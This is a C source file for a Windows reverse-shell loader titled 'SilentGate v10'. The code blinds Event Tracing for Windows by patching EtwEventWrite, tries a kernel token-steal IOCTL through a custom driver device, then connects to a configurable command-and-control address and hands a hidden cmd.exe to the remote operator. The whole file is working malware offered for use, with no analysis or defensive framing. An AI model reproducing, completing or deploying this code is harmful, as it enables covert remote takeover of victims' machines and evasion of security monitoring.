/*
 * SilentGate v10 - Reverse Shell Loader
 * Author: JarDani
 * Direct imports - works on Win10 and Win11
 * No PEB walk - more reliable
 */

#include <winsock2.h>
#include <windows.h>

/* ── CONFIGURATION ─────────────────────────────────────────
 * Set C2_IP and C2_PORT before compiling
 * C2_IP: IP in network byte order
 *   192.168.178.144 = 0xC0A8B290
 * C2_PORT: port in network byte order
 *   443 = 0xBB01  4444 = 0x5C11
 * ────────────────────────────────────────────────────────── */
#ifndef C2_IP
#define C2_IP   0xC0A8B290
#endif
#ifndef C2_PORT
#define C2_PORT 0xBB01
#endif

static DWORD WINAPI shell_thread(LPVOID param) {
    /* Small delay */
    Sleep(1000);

    /* ETW patch - blind telemetry */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if(ntdll) {
        FARPROC etw = GetProcAddress(ntdll, "EtwEventWrite");
        if(etw) {
            DWORD old = 0;
            VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
            *(BYTE*)etw = 0xC3;
            VirtualProtect(etw, 1, old, &old);
        }
    }

    /* Try kernel token steal if driver loaded */
    {
        char dev[] = "\\\\.\\SilentGate";
        HANDLE hd = CreateFileA(dev,
            GENERIC_READ|GENERIC_WRITE, 0, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if(hd != INVALID_HANDLE_VALUE) {
            DWORD nb = 0;
            DWORD ioctl = (0x22 << 16) | (0x904 << 2);
            DeviceIoControl(hd, ioctl, NULL, 0, NULL, 0, &nb, NULL);
            CloseHandle(hd);
        }
    }

    /* Initialize Winsock */
    WSADATA wsa = {0};
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;

    /* Create socket */
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                          NULL, 0, 0);
    if(s == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    /* Connect to C2 */
    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_port        = C2_PORT;
    sa.sin_addr.s_addr = C2_IP;

    if(connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    /* Spawn cmd.exe with socket as stdio */
    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (HANDLE)s;
    si.hStdOutput  = (HANDLE)s;
    si.hStdError   = (HANDLE)s;

    PROCESS_INFORMATION pi = {0};
    char cmd[] = "cmd.exe";

    if(!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
    return 0;
}

int main(void) {
    HANDLE t = CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
    if(t) {
        WaitForSingleObject(t, 120000);
        CloseHandle(t);
    }
    return 0;
}
